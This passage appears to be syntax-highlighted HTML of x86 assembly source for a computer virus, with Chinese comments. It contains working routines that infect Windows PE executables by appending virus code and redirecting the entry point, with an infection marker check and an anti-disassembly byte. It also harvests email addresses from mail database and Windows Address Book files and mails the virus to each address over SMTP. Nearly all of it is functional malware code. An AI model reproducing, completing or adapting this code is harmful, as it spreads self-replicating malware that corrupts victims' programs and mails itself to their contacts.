    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">FixPeFileOver</span><span class="sc0">   
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edi.fhObjectTable00</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.fhObjectCount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">FindLastObjectTable</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ObjectTable</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">FindLastObjectTable</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">     </span><span class="sc1">;超界检查</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">FixPeFileOver</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.fhEntryRVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.otRVA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;检查病毒是否已经感染该PE文件</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StartFixPeFile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.otPhysOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0e860h</span><span class="sc0">   </span><span class="sc1">;是否是病毒指令</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">FixPeFileOver</span><span class="sc0">
</span><span class="sc5">BuildVirusCodeInStack</span><span class="sc4">:</span><span class="sc0">
    
</span><span class="sc5">StartFixPeFile</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">ebx.otFlags</span><span class="sc4">],</span><span class="sc2">0e0000000h</span><span class="sc0"> </span><span class="sc1">;Code|Init|Exec|Read|Write[CIERW]属性</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc1">;探测文件长度</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0">   </span><span class="sc5">FixPeFileOver</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;保存文件长度信息</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.otPhysOffset</span><span class="sc4">]</span><span class="sc1">;计算ObjectTable物理尺寸</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.otPhysSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.otVirtSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NoFixVirtSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.otVirtSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;扩展虚拟尺寸</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.fhObjectAlign</span><span class="sc4">]</span><span class="sc1">;取Object对齐信息</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;收尾数</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;收尾数</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;取整数</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;取整数</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;计算新ImageSize增加值</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.fhImageSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;扩展映射总尺寸   </span><span class="sc0">
</span><span class="sc5">NoFixVirtSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;弹出文件长度信息</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.otPhysOffset</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">ebx.otRVA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;计算出新PE程序入口</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.fhEntryRVA</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.fhImageBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetBaseAddress</span><span class="sc0">
</span><span class="sc5">GetBaseAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetBaseAddress</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldEntryRVA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">;记录老PE程序入口</span><span class="sc0">
</span><span class="sc5">WriteVirusToFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldEntryRVA</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FixPeFileOver</span><span class="sc0">
</span><span class="sc5">WritePeHeader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc5">hPeFile</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">  
</span><span class="sc5">FixPeFileOver</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">MAX_BUFF_SIZE</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FixPeFile</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">FoundMailObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">eMail</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">  
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">BuildVirusPathInStack</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FoundMailObjectEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SmtpSendMail</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">FoundMailObjectEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FoundMailObject</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">EnumDbMail</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">DbFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc5">DbFile</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">EnumDbMailEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">ScanEmailStr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">ReadDbFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CloseDbFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsMailAtFlag</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsMailDotFlag</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsMailAddr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StoreMailChar</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsMailAddr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StoreMailChar</span><span class="sc0">
</span><span class="sc5">IsMailAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'@'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FoundMailObject</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanEmailStr</span><span class="sc0">  
</span><span class="sc5">IsMailDotFlag</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">StoreMailChar</span><span class="sc0">
</span><span class="sc5">IsMailAtFlag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc5">StoreMailChar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ReadDbFile</span><span class="sc0">
</span><span class="sc5">CloseDbFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0"> 
</span><span class="sc5">EnumDbMailEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnumDbMail</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">EnumWabMail</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">WabFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLOpen</span><span class="sc4">],</span><span class="sc5">WabFile</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">EnumWabMailEnd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CloseWabFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;得到Unicode邮件名偏移</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLSeek</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;得到Unicode邮件名个数</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CloseWabFile</span><span class="sc0"> 
</span><span class="sc5">ContReadWabMail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLRead</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc1">;读一个记录  </span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlWideCharToMultiByte</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FoundMailObject</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContReadWabMail</span><span class="sc0">
</span><span class="sc5">CloseWabFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLClose</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">EnumWabMailEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EnumWabMail</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MakeMailFile</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">eMail</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">hVirFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">,</span><span class="sc5">hEmlFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">OldEsp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">OldEsp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FormatMailHeader</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">eMail</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc5">hEmlFile</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
